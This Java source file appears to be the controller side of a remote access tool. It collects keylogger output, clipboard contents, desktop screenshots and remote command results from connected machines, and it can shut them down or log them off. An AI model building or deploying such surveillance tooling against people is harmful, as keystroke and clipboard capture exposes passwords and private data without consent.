package Server;

import Server.Exception.ClientDisconnectedException;
import Server.GUI.*;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.Packet;
import org.jfree.data.time.DynamicTimeSeriesCollection;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Base64;

import javax.imageio.ImageIO;


public class ConnectedClient{

    private PrintWriter pw;
    private BufferedReader br;
    private String lastIP;
    private String userName;
    private String os;

    // GUIs
    private GuiDesktop desktop;
    private Gui_Keylogger keylogger;
    private GuiCommand command;
    private Gui_Performance performance;
    private Gui_HardwareInfo hardwareInfo;

    public DynamicTimeSeriesCollection[] connectedTimeSeries = new DynamicTimeSeriesCollection[2];

    public ConnectedClient(Socket socket) throws IOException {
        this.lastIP = socket.getInetAddress().getHostAddress();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    pw = new PrintWriter(socket.getOutputStream(), true);
                    br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    System.out.println("Connected client: " + socket.getRemoteSocketAddress());
                    listen();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void listen() {
        boolean disconnected = false;
        while (!disconnected) {
            try {
                String line = br.readLine();
                if (line == null) {
                    throw new ClientDisconnectedException();
                }

                Packet packet = NetUtils.readPacket(line);
                if (packet.action == MessageType.GUI_TEXT.getID()) {
                    new GuiText(packet.data);
                } else if (packet.action == MessageType.CLIENT_INFO.getID()) {
                    this.os = packet.data.get(0);
                    this.userName = packet.data.get(1);
                    Server.getInstance().getGUI().updateInfo();
                } else if (packet.action == MessageType.COMMAND.getID()) {
                    if (command == null) {
                        command = new GuiCommand(this);
                    }
                    if (this.command.isVisible() || this.command.isActive()) {
                        System.out.println("packet:" + packet.data);
                        if (packet.data != null) {
                            command.AddTextToArea(packet.data.get(1));
                        }
                    }
                } else if (packet.action == MessageType.DESKTOP.getID()) {
                    if (desktop == null) {
                        desktop = new GuiDesktop(this);
                    }
                    if (this.desktop.isActive()) {
                        byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0));
                        ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
                        BufferedImage i = ImageIO.read(bais);
                        if (i != null) {
                            this.desktop.setImage(i);
                        }
                    }
                } else if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
                    if (performance == null) {
                        performance = new Gui_Performance(this);
                    }
                    if (this.performance.isActive() && this.performance.isVisible()) {
                        System.out.println("Performance received: " + packet.data);
                        if (packet.data != null) {
                            if (packet.data.get(0).equals("cpu")) {
                                performance.setCpu(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("ram")) {
                                performance.setRAM(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("disk")) {
                                performance.setDisk(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("process")) {
                                performance.setProcess(packet.data.get(1));
                            }
                        }
                    } else {
                        sendStopPerformanceTrack(this.getPrintWriter());
                    }
                } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
                    if (hardwareInfo == null) {
                        hardwareInfo = new Gui_HardwareInfo(this);
                    }
                    if (this.hardwareInfo.isActive()) {
                        System.out.println("Hardware info received: " + packet.data);
                        if (packet.data != null) {
                            if (packet.data.get(0).equals("cpu")) {
                                hardwareInfo.SetCPUText(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("disk")) {
                                hardwareInfo.SetDiskText(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("display")) {
                                hardwareInfo.SetDisplayText(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("disk")) {
                                hardwareInfo.SetDiskText(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("gpu")) {
                                hardwareInfo.SetGPUText(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("os")) {
                                hardwareInfo.SetOSText(packet.data.get(1));
                            }
                            if (packet.data.get(0).equals("ram")) {
                                hardwareInfo.SetRAMText(packet.data.get(1));
                            }
                        }
                    }
                } else if (packet.action == MessageType.KEYLOGGER.getID()) {
                    System.out.println("Received keylogger data: " + packet.data );
                    if (keylogger == null) {
                        keylogger = new Gui_Keylogger(this);
                    }
                    if (keylogger.isActive() || keylogger.isVisible()) {
                        System.out.println("Keylogger data received" + packet.data);
                        if (packet.data != null) {
                            keylogger.jTextAreaKeyLogger.setText(packet.data.get(0));
                        }
                    }
                } else if (packet.action == MessageType.CLIPBOARD.getID()) {
                    System.out.println("Received clipboard data: " + packet.data);
                    if (keylogger == null) {
                        this.keylogger = new Gui_Keylogger(this);
                    }
                    if (keylogger.isActive() || keylogger.isVisible()) {
                        System.out.println("Clipboard data received" + packet.data);
                        if (packet.data != null) {
                            keylogger.jTextAreaClipboard.setText(packet.data.get(0));
                        }
                    }
                }
            } catch (ClientDisconnectedException e) {
                e.printStackTrace();
                Server.getInstance().removeClient(this);
                disconnected = true;
            } catch (SocketException e1 ) {
                disconnected = true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        Server.getInstance().removeClient(this);
    }

    public void OpenDesktopView() {
        if (this.desktop == null) {
            this.desktop = new GuiDesktop(this);
        }
        this.desktop.setVisible(true);
    }

    public void OpenKeyLogView() {
        if (this.keylogger == null) {
            this.keylogger = new Gui_Keylogger(this);
        }
        this.keylogger.setVisible(true);
    }

    public void OpenCommandView() {
        if (this.command == null) {
            this.command = new GuiCommand(this);
        }
        this.command.setVisible(true);
    }

    public void OpenPerformanceView() {
        if (this.performance == null) {
            this.performance = new Gui_Performance(this);
        }
        this.performance.setVisible(true);
    }

    public void OpenHardwareInfoView() {
        if (this.hardwareInfo == null) {
            this.hardwareInfo = new Gui_HardwareInfo(this);
        }
        this.hardwareInfo.setVisible(true);
    }
    public void SendShutDown(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.SHUTDOWN.getID();
        try {
            NetUtils.sendMessage(packet, pw);
        } catch (Exception e) {
            System.out.println("Cannot send shutdown packet");
        }
    }

    public void SendLogOff(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.LOGOFF.getID();
        try {
            NetUtils.sendMessage(packet, pw);
        } catch (Exception e) {
            System.out.println("Cannot send log off packet");
        }
    }

    public void sendStopPerformanceTrack(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.PERFORMANCE_TRACK.getID();
        packet.data = new ArrayList<>();
        packet.data.add("stop");
        try {
            NetUtils.sendMessage(packet, pw);
        } catch (Exception e){
            System.out.println("Failed to send stop performance tracking packet");
        }
    }
    public PrintWriter getPrintWriter() {
        return this.pw;
    }

    public String getIP() {
        return this.lastIP;
    }

    public String getUsername() {
        return this.userName;
    }

    @Override
    public String toString() {
        return this.userName + " | " + this.os + " | " + this.getIP();
    }
}
